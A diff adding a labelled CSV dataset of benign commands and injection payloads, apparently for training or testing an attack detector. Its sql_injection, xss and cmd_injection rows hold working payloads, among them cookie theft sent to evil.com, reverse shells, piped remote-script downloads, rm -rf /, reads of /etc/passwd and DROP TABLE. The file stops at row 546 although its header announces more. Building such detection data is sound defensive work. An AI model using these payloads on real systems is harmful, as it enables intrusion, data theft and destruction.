@@ -1,0 +1,1001 @@
+id,payload,label
+1,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+2,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+3,docker run nginx,benign
+4,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+5,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+6,git clone https://github.com/user/repo.git,benign
+7,npm install express,benign
+8,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+9,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+10,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+11,curl -I https://api.example.com/status,benign
+12,SELECT price FROM items WHERE id = 209,benign
+13,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+14,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+15,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+16,npm install express,benign
+17,docker run nginx,benign
+18,npm install express,benign
+19,docker run nginx,benign
+20,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+21,curl -I https://api.example.com/status,benign
+22,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+23,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+24,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+25,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+26,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+27,curl -I https://api.example.com/status,benign
+28,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+29,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+30,docker run nginx,benign
+31,npm install express,benign
+32,npm install express,benign
+33,git clone https://github.com/user/repo.git,benign
+34,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+35,docker run nginx,benign
+36,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+37,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+38,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+39,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+40,SELECT price FROM items WHERE id = 209,benign
+41,docker run nginx,benign
+42,git clone https://github.com/user/repo.git,benign
+43,curl -I https://api.example.com/status,benign
+44,npm install express,benign
+45,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+46,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+47,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+48,git clone https://github.com/user/repo.git,benign
+49,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+50,curl -I https://api.example.com/status,benign
+51,SELECT price FROM items WHERE id = 209,benign
+52,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+53,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+54,curl -I https://api.example.com/status,benign
+55,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+56,SELECT price FROM items WHERE id = 209,benign
+57,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+58,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+59,npm install express,benign
+60,git clone https://github.com/user/repo.git,benign
+61,' OR 1=1 ORDER BY 1--,sql_injection
+62,'; exec xp_cmdshell('net user'); --,sql_injection
+63,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+64,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+65,admin' --,sql_injection
+66,'; exec xp_cmdshell('net user'); --,sql_injection
+67,'; WAITFOR DELAY '0:0:10'--,sql_injection
+68,' OR '1'='1,sql_injection
+69,')) OR 1=1--,sql_injection
+70,' OR 1=1 ORDER BY 1--,sql_injection
+71,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+72,'; WAITFOR DELAY '0:0:10'--,sql_injection
+73,' OR 1=1 ORDER BY 1--,sql_injection
+74,admin' --,sql_injection
+75,' OR 1=1 ORDER BY 1--,sql_injection
+76,javascript:alert(document.domain),xss
+77,<svg onload=alert(1)>,xss
+78,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+79,javascript:alert(document.domain),xss
+80,<input onfocus=write(1) autofocus>,xss
+81,<svg onload=alert(1)>,xss
+82,<input onfocus=write(1) autofocus>,xss
+83,javascript:alert(document.domain),xss
+84,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
+85,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
+86,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+87,<img src=x onerror=alert('XSS')>,xss
+88,<img src=x onerror=alert('XSS')>,xss
+89,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+90,<input onfocus=write(1) autofocus>,xss
+91,| cat /etc/passwd,cmd_injection
+92,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
+93,; wget http://malicious.com/shell.php,cmd_injection
+94,|| echo 'evil' > script.sh,cmd_injection
+95,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
+96,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
+97,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
+98,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
+99,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
+100,& net user administrator /add,cmd_injection
+101,SELECT price FROM items WHERE id = 209,benign
+102,git clone https://github.com/user/repo.git,benign
+103,docker run nginx,benign
+104,curl -I https://api.example.com/status,benign
+105,curl -I https://api.example.com/status,benign
+106,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+107,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+108,SELECT price FROM items WHERE id = 209,benign
+109,npm install express,benign
+110,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+111,npm install express,benign
+112,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+113,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+114,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+115,git clone https://github.com/user/repo.git,benign
+116,git clone https://github.com/user/repo.git,benign
+117,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+118,git clone https://github.com/user/repo.git,benign
+119,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+120,npm install express,benign
+121,curl -I https://api.example.com/status,benign
+122,curl -I https://api.example.com/status,benign
+123,docker run nginx,benign
+124,git clone https://github.com/user/repo.git,benign
+125,git clone https://github.com/user/repo.git,benign
+126,git clone https://github.com/user/repo.git,benign
+127,SELECT price FROM items WHERE id = 209,benign
+128,curl -I https://api.example.com/status,benign
+129,SELECT price FROM items WHERE id = 209,benign
+130,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+131,docker run nginx,benign
+132,docker run nginx,benign
+133,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+134,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+135,SELECT price FROM items WHERE id = 209,benign
+136,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+137,git clone https://github.com/user/repo.git,benign
+138,curl -I https://api.example.com/status,benign
+139,curl -I https://api.example.com/status,benign
+140,curl -I https://api.example.com/status,benign
+141,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+142,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+143,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+144,npm install express,benign
+145,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+146,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+147,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+148,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+149,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+150,git clone https://github.com/user/repo.git,benign
+151,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+152,SELECT price FROM items WHERE id = 209,benign
+153,curl -I https://api.example.com/status,benign
+154,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+155,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+156,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+157,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+158,npm install express,benign
+159,npm install express,benign
+160,npm install express,benign
+161,admin' --,sql_injection
+162,'; WAITFOR DELAY '0:0:10'--,sql_injection
+163,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+164,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+165,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+166,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+167,'; WAITFOR DELAY '0:0:10'--,sql_injection
+168,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+169,'; WAITFOR DELAY '0:0:10'--,sql_injection
+170,admin' --,sql_injection
+171,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+172,'; exec xp_cmdshell('net user'); --,sql_injection
+173,' OR 1=1 ORDER BY 1--,sql_injection
+174,')) OR 1=1--,sql_injection
+175,"' UNION SELECT username,password FROM admin_users --",sql_injection
+176,<script>alert(document.cookie)</script>,xss
+177,javascript:alert(document.domain),xss
+178,<script>alert(document.cookie)</script>,xss
+179,<body onload=alert('XSS')>,xss
+180,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+181,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+182,javascript:alert(document.domain),xss
+183,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+184,<input onfocus=write(1) autofocus>,xss
+185,<script>alert(document.cookie)</script>,xss
+186,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+187,<img src=x onerror=alert('XSS')>,xss
+188,<input onfocus=write(1) autofocus>,xss
+189,<img src=x onerror=alert('XSS')>,xss
+190,<script>alert(document.cookie)</script>,xss
+191,; wget http://malicious.com/shell.php,cmd_injection
+192,; wget http://malicious.com/shell.php,cmd_injection
+193,; wget http://malicious.com/shell.php,cmd_injection
+194,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
+195,; rm -rf /,cmd_injection
+196,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
+197,|| echo 'evil' > script.sh,cmd_injection
+198,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
+199,| cat /etc/passwd,cmd_injection
+200,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
+201,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+202,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+203,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+204,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+205,docker run nginx,benign
+206,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+207,npm install express,benign
+208,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+209,docker run nginx,benign
+210,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+211,SELECT price FROM items WHERE id = 209,benign
+212,git clone https://github.com/user/repo.git,benign
+213,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+214,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+215,SELECT price FROM items WHERE id = 209,benign
+216,SELECT price FROM items WHERE id = 209,benign
+217,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+218,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+219,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+220,npm install express,benign
+221,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+222,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+223,SELECT price FROM items WHERE id = 209,benign
+224,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+225,npm install express,benign
+226,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+227,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+228,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+229,curl -I https://api.example.com/status,benign
+230,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+231,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+232,curl -I https://api.example.com/status,benign
+233,docker run nginx,benign
+234,curl -I https://api.example.com/status,benign
+235,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+236,curl -I https://api.example.com/status,benign
+237,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+238,SELECT price FROM items WHERE id = 209,benign
+239,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+240,docker run nginx,benign
+241,git clone https://github.com/user/repo.git,benign
+242,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+243,git clone https://github.com/user/repo.git,benign
+244,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+245,npm install express,benign
+246,git clone https://github.com/user/repo.git,benign
+247,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+248,docker run nginx,benign
+249,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+250,SELECT price FROM items WHERE id = 209,benign
+251,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+252,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+253,SELECT price FROM items WHERE id = 209,benign
+254,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+255,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+256,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+257,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+258,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+259,SELECT price FROM items WHERE id = 209,benign
+260,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+261,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+262,'; exec xp_cmdshell('net user'); --,sql_injection
+263,'; DROP TABLE users; --,sql_injection
+264,admin' --,sql_injection
+265,'; DROP TABLE users; --,sql_injection
+266,"' UNION SELECT username,password FROM admin_users --",sql_injection
+267,'; DROP TABLE users; --,sql_injection
+268,' OR 1=1 ORDER BY 1--,sql_injection
+269,' OR 1=1 ORDER BY 1--,sql_injection
+270,'; exec xp_cmdshell('net user'); --,sql_injection
+271,admin' --,sql_injection
+272,'; exec xp_cmdshell('net user'); --,sql_injection
+273,' OR '1'='1,sql_injection
+274,'; DROP TABLE users; --,sql_injection
+275,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+276,<script>alert(document.cookie)</script>,xss
+277,<body onload=alert('XSS')>,xss
+278,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
+279,<svg onload=alert(1)>,xss
+280,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
+281,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+282,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+283,javascript:alert(document.domain),xss
+284,<script>alert(document.cookie)</script>,xss
+285,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+286,<img src=x onerror=alert('XSS')>,xss
+287,<img src=x onerror=alert('XSS')>,xss
+288,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
+289,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+290,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
+291,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
+292,| cat /etc/passwd,cmd_injection
+293,| cat /etc/passwd,cmd_injection
+294,| cat /etc/passwd,cmd_injection
+295,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
+296,& net user administrator /add,cmd_injection
+297,; rm -rf /,cmd_injection
+298,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
+299,& net user administrator /add,cmd_injection
+300,& net user administrator /add,cmd_injection
+301,git clone https://github.com/user/repo.git,benign
+302,curl -I https://api.example.com/status,benign
+303,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+304,git clone https://github.com/user/repo.git,benign
+305,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+306,SELECT price FROM items WHERE id = 209,benign
+307,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+308,npm install express,benign
+309,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+310,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+311,curl -I https://api.example.com/status,benign
+312,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+313,git clone https://github.com/user/repo.git,benign
+314,SELECT price FROM items WHERE id = 209,benign
+315,git clone https://github.com/user/repo.git,benign
+316,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+317,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+318,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+319,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+320,curl -I https://api.example.com/status,benign
+321,npm install express,benign
+322,git clone https://github.com/user/repo.git,benign
+323,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+324,curl -I https://api.example.com/status,benign
+325,SELECT price FROM items WHERE id = 209,benign
+326,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+327,git clone https://github.com/user/repo.git,benign
+328,curl -I https://api.example.com/status,benign
+329,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+330,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+331,git clone https://github.com/user/repo.git,benign
+332,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+333,git clone https://github.com/user/repo.git,benign
+334,SELECT price FROM items WHERE id = 209,benign
+335,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+336,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+337,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+338,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+339,git clone https://github.com/user/repo.git,benign
+340,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+341,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+342,curl -I https://api.example.com/status,benign
+343,docker run nginx,benign
+344,npm install express,benign
+345,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+346,curl -I https://api.example.com/status,benign
+347,npm install express,benign
+348,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+349,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+350,docker run nginx,benign
+351,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+352,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+353,git clone https://github.com/user/repo.git,benign
+354,curl -I https://api.example.com/status,benign
+355,npm install express,benign
+356,docker run nginx,benign
+357,SELECT price FROM items WHERE id = 209,benign
+358,docker run nginx,benign
+359,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+360,curl -I https://api.example.com/status,benign
+361,admin' --,sql_injection
+362,')) OR 1=1--,sql_injection
+363,'; exec xp_cmdshell('net user'); --,sql_injection
+364,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+365,'; DROP TABLE users; --,sql_injection
+366,'; DROP TABLE users; --,sql_injection
+367,"' UNION SELECT username,password FROM admin_users --",sql_injection
+368,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+369,'; DROP TABLE users; --,sql_injection
+370,'; DROP TABLE users; --,sql_injection
+371,'; exec xp_cmdshell('net user'); --,sql_injection
+372,'; WAITFOR DELAY '0:0:10'--,sql_injection
+373,'; DROP TABLE users; --,sql_injection
+374,')) OR 1=1--,sql_injection
+375,'; WAITFOR DELAY '0:0:10'--,sql_injection
+376,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+377,<input onfocus=write(1) autofocus>,xss
+378,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+379,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+380,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+381,<img src=x onerror=alert('XSS')>,xss
+382,<input onfocus=write(1) autofocus>,xss
+383,<body onload=alert('XSS')>,xss
+384,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+385,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+386,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
+387,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+388,<body onload=alert('XSS')>,xss
+389,<input onfocus=write(1) autofocus>,xss
+390,<input onfocus=write(1) autofocus>,xss
+391,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
+392,|| echo 'evil' > script.sh,cmd_injection
+393,; wget http://malicious.com/shell.php,cmd_injection
+394,; wget http://malicious.com/shell.php,cmd_injection
+395,`curl http://evil.com/script.sh | sh`,cmd_injection
+396,; rm -rf /,cmd_injection
+397,| cat /etc/passwd,cmd_injection
+398,; rm -rf /,cmd_injection
+399,; rm -rf /,cmd_injection
+400,; wget http://malicious.com/shell.php,cmd_injection
+401,SELECT price FROM items WHERE id = 209,benign
+402,git clone https://github.com/user/repo.git,benign
+403,git clone https://github.com/user/repo.git,benign
+404,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+405,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+406,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+407,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+408,curl -I https://api.example.com/status,benign
+409,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+410,docker run nginx,benign
+411,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+412,git clone https://github.com/user/repo.git,benign
+413,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+414,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+415,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+416,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+417,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+418,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+419,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+420,SELECT price FROM items WHERE id = 209,benign
+421,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+422,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+423,docker run nginx,benign
+424,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+425,SELECT price FROM items WHERE id = 209,benign
+426,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+427,git clone https://github.com/user/repo.git,benign
+428,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+429,docker run nginx,benign
+430,curl -I https://api.example.com/status,benign
+431,git clone https://github.com/user/repo.git,benign
+432,curl -I https://api.example.com/status,benign
+433,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+434,npm install express,benign
+435,docker run nginx,benign
+436,npm install express,benign
+437,curl -I https://api.example.com/status,benign
+438,git clone https://github.com/user/repo.git,benign
+439,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+440,git clone https://github.com/user/repo.git,benign
+441,git clone https://github.com/user/repo.git,benign
+442,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+443,SELECT price FROM items WHERE id = 209,benign
+444,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+445,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+446,docker run nginx,benign
+447,docker run nginx,benign
+448,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+449,curl -I https://api.example.com/status,benign
+450,curl -I https://api.example.com/status,benign
+451,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+452,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+453,git clone https://github.com/user/repo.git,benign
+454,npm install express,benign
+455,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+456,SELECT price FROM items WHERE id = 209,benign
+457,npm install express,benign
+458,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+459,curl -I https://api.example.com/status,benign
+460,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+461,'; WAITFOR DELAY '0:0:10'--,sql_injection
+462,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+463,'; WAITFOR DELAY '0:0:10'--,sql_injection
+464,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+465,' OR '1'='1,sql_injection
+466,'; DROP TABLE users; --,sql_injection
+467,' OR 1=1 ORDER BY 1--,sql_injection
+468,'; exec xp_cmdshell('net user'); --,sql_injection
+469,'; WAITFOR DELAY '0:0:10'--,sql_injection
+470,' OR 1=1 ORDER BY 1--,sql_injection
+471,admin' --,sql_injection
+472,' OR '1'='1,sql_injection
+473,"' UNION SELECT username,password FROM admin_users --",sql_injection
+474,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+475,'; DROP TABLE users; --,sql_injection
+476,<img src=x onerror=alert('XSS')>,xss
+477,<img src=x onerror=alert('XSS')>,xss
+478,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
+479,<img src=x onerror=alert('XSS')>,xss
+480,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+481,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
+482,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+483,<input onfocus=write(1) autofocus>,xss
+484,<svg onload=alert(1)>,xss
+485,<input onfocus=write(1) autofocus>,xss
+486,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+487,javascript:alert(document.domain),xss
+488,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+489,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+490,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
+491,; rm -rf /,cmd_injection
+492,|| echo 'evil' > script.sh,cmd_injection
+493,`curl http://evil.com/script.sh | sh`,cmd_injection
+494,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
+495,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
+496,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
+497,& net user administrator /add,cmd_injection
+498,| cat /etc/passwd,cmd_injection
+499,`curl http://evil.com/script.sh | sh`,cmd_injection
+500,; rm -rf /,cmd_injection
+501,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+502,npm install express,benign
+503,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+504,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+505,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+506,git clone https://github.com/user/repo.git,benign
+507,git clone https://github.com/user/repo.git,benign
+508,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+509,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+510,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+511,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+512,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+513,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+514,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+515,SELECT price FROM items WHERE id = 209,benign
+516,git clone https://github.com/user/repo.git,benign
+517,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+518,npm install express,benign
+519,git clone https://github.com/user/repo.git,benign
+520,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+521,npm install express,benign
+522,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+523,docker run nginx,benign
+524,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+525,curl -I https://api.example.com/status,benign
+526,curl -I https://api.example.com/status,benign
+527,curl -I https://api.example.com/status,benign
+528,docker run nginx,benign
+529,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+530,npm install express,benign
+531,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+532,docker run nginx,benign
+533,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+534,SELECT price FROM items WHERE id = 209,benign
+535,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+536,git clone https://github.com/user/repo.git,benign
+537,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+538,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+539,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+540,docker run nginx,benign
+541,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+542,git clone https://github.com/user/repo.git,benign
+543,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+544,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+545,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+546,docker run nginx,benign
